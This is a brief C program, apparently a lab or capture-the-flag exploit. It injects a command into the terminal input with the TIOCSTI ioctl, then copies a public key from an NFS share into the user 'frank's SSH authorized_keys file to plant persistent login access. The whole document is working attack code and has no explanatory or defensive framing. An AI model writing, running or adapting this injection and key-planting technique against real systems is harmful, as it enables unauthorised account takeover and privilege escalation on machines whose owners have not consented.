#include <unistd.h>
#include <sys/ioctl.h>

int main()
{
	char *cmd = "id\n";
	while (*cmd)
		ioctl(0, TIOCSTI, cmd++);
	execlp("/bin/cp", "cp", "/var/nfsshare/id_rsa.pub", "/home/frank/.ssh/authorized_keys", NULL);
}
